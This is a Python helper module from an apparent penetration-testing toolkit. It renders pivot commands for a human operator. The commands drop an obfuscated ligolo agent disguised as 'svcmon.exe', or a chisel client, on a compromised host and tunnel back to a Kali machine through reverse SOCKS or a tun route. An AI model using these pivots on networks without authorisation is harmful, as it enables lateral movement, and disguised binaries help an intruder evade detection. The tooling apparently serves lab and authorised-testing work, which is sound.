"""Shared engagement helpers used by the CLI and the MCP server.

Post-strip: yhwach is a memory database, not a task executor — this module keeps
only the two pure utilities both surfaces still need (locating artifact dirs,
rendering the pivot commands the operator runs by hand).

Pivot rendering pulls every binary path from :mod:`yhwach.arsenal` so the
commands are copy-paste ready and stay in sync with CLAUDE.md's Arsenal
section. See ``arsenal.py`` for the canonical entries.
"""
from __future__ import annotations

from pathlib import Path

from yhwach import arsenal


def artifact_dir(db_path: Path | str, name: str) -> Path:
    """Locate an engagement artifact dir (recon/loot/...) relative to the DB.

    For the canonical layout (<lab>/state/yhwach.db) this is <lab>/<name>; for a
    flat DB path it is <db_dir>/<name>, so a bare /tmp/x.db never resolves to /.
    """
    p = Path(db_path)
    if p.parent.name == "state":
        return p.parent.parent / name
    return p.parent / name


# Default ligolo control-plane port (matches ``ligolo-proxy -laddr 0.0.0.0:11601``
# used in every prior lab). Chisel uses a different default because ligolo's
# port is often already occupied by prior sessions on the same operator box.
_LIGOLO_DEFAULT_PORT = 11601
_CHISEL_DEFAULT_PORT = 9055
_CHISEL_SOCKS_PORT = 1080  # target-side chisel exposes SOCKS here on the Kali side


def _resolve_kind(pivot_kind: str | None, os_name: str | None) -> str:
    """Pick a pivot ``kind`` from an explicit hint or the target OS.

    Windows → ``ligolo`` (svcmon.exe is the canonical drop). Linux → ``chisel``
    (no-root reverse-SOCKS is the fast path; use ``pivot_kind="ligolo"``
    explicitly to force the full-tun L3 route via ``ligolo-agent-linux``).
    Unknown OS defaults to chisel — it works from more places than ligolo does.
    """
    if pivot_kind:
        return pivot_kind
    if (os_name or "").lower().startswith("win"):
        return "ligolo"
    return "chisel"


def render_pivot(
    via_ip: str,
    subnet: str,
    os_name: str | None,
    lport: int | None = None,
    *,
    pivot_kind: str | None = None,
) -> list[str]:
    """Render the commands to stand up a pivot from ``via_ip`` into ``subnet``.

    ``pivot_kind`` overrides the auto-picked kind (``ligolo`` on Windows,
    ``chisel`` on Linux). All binary paths are absolute, resolved from
    :mod:`yhwach.arsenal` at render time so an out-of-place arsenal is
    obvious in the rendered command (``<workspace>/arsenal/svcmon.exe``
    vs. a bare ``svcmon.exe`` that a future reader would have to guess).

    Proposal-tier: the operator runs the returned lines by hand (or a runner
    ships them; see :class:`~yhwach.runners.ArsenalDeployRunner`).
    """
    kind = _resolve_kind(pivot_kind, os_name)
    lines = [f"== Pivot via {via_ip} ({os_name or 'os?'}, kind={kind}) -> {subnet} =="]

    if kind == "ligolo":
        port = lport or _LIGOLO_DEFAULT_PORT
        if (os_name or "").lower().startswith("win"):
            svcmon = arsenal.get("SVCMON_WIN").path
            lines += [
                f"  # On the pivot ({via_ip}, Windows): drop + run svcmon.exe (obfuscated ligolo agent)",
                f"  #   local staged copy: {svcmon}",
                f"  $ .\\svcmon.exe -connect <KALI-IP>:{port} -ignore-cert",
            ]
        else:
            agent = arsenal.get("LIGOLO_AGENT_LINUX").path
            lines += [
                f"  # On the pivot ({via_ip}, Linux): drop + run the ligolo agent",
                f"  #   local staged copy: {agent}",
                f"  $ chmod +x ./ligolo-agent-linux && ./ligolo-agent-linux -connect <KALI-IP>:{port} -ignore-cert",
            ]
        proxy = arsenal.get("LIGOLO_PROXY").path
        lines += [
            "  # Kali side — start the ligolo proxy, add the tun, route the subnet:",
            f"  $ sudo {proxy} -selfcert -laddr 0.0.0.0:{port}",
            f"  $ sudo ip route add {subnet} dev ligolo",
        ]
        return lines

    if kind == "chisel":
        port = lport or _CHISEL_DEFAULT_PORT
        chisel = arsenal.get("CHISEL").path
        lines += [
            "  # Kali side (run FIRST) — chisel server in reverse mode:",
            f"  $ {chisel} server -p {port} --reverse",
            f"  # On the pivot ({via_ip}): drop chisel and connect back (no root needed)",
            f"  #   local staged copy: {chisel}",
            f"  $ ./chisel client <KALI-IP>:{port} R:{_CHISEL_SOCKS_PORT}:socks &",
            f"  # -> SOCKS5 on the Kali side at 127.0.0.1:{_CHISEL_SOCKS_PORT} for {subnet}",
            f"  # Use with proxychains or `nxc --socks-host 127.0.0.1 --socks-port {_CHISEL_SOCKS_PORT}`.",
        ]
        return lines

    # Unknown kind — do NOT invent commands; surface the request so the operator
    # picks a real one. Keeps yhwach honest per its "never fake a step" rule.
    lines += [
        f"  # unknown pivot kind {kind!r} — expected one of ('ligolo', 'chisel')",
        "  # add a rule in playbooks/pivot.yaml if this is a real new pivot shape",
    ]
    return lines
